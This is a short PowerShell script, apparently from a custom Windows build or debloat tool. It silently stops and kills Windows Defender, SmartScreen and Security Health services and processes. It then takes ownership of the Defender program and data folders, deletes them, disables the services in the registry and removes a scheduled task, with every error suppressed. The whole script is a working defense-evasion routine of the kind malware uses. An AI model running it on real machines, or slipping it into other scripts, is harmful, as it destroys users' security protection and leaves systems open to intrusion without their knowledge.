$ErrorActionPreference = 'SilentlyContinue'
foreach ($svc in @('WinDefend','WdNisSvc','WdFilter','WdBoot','WdNisDrv','MDCoreSvc','Sense','SecurityHealthService','wscsvc','MsSecCore','MsSecFlt','MsSecWfp','webthreatdefsvc','webthreatdefusersvc','wtd','SgrmBroker','SgrmAgent')) {
    try { & sc.exe stop $svc 2>&1 | Out-Null } catch {}
}
Start-Sleep -Seconds 3
foreach ($p in @('MsMpEng','MpCmdRun','NisSrv','SecurityHealthHost','SecurityHealthService','SecurityHealthSystray','MpDefenderCoreService','MpDlpService','smartscreen')) {
    try { Get-Process -Name $p -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
}
foreach ($d in @("$env:ProgramFiles\Windows Defender", "$env:ProgramFiles\Windows Defender Advanced Threat Protection", "${env:ProgramFiles(x86)}\Windows Defender", "$env:ProgramData\Microsoft\Windows Defender", "$env:ProgramData\Microsoft\Windows Defender Advanced Threat Protection")) {
    if (Test-Path -LiteralPath $d) {
        try { & takeown.exe /f $d /r /d y 2>&1 | Out-Null } catch {}
        try { & icacls.exe $d /grant administrators:F /t /c /q 2>&1 | Out-Null } catch {}
        try { Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction Stop}
        catch {}
    } else {}
}
foreach ($s in @('WinDefend','WdFilter','WdNisDrv','WdBoot','WdNisSvc','MDCoreSvc','MsSecFlt','MsSecWfp','MsSecCore','SecurityHealthService','Sense','wscsvc','webthreatdefsvc','webthreatdefusersvc','wtd','SgrmAgent','SgrmBroker')) {
    try {
        Set-ItemProperty -LiteralPath ('HKLM:\SYSTEM\CurrentControlSet\Services\' + $s) -Name Start -Value 4 -Type DWord -Force -ErrorAction Stop
    } catch {}
}
try { & schtasks.exe /delete /tn 'ReimaginedOSDefenderCleanup' /f 2>&1 | Out-Null } catch {}
exit 0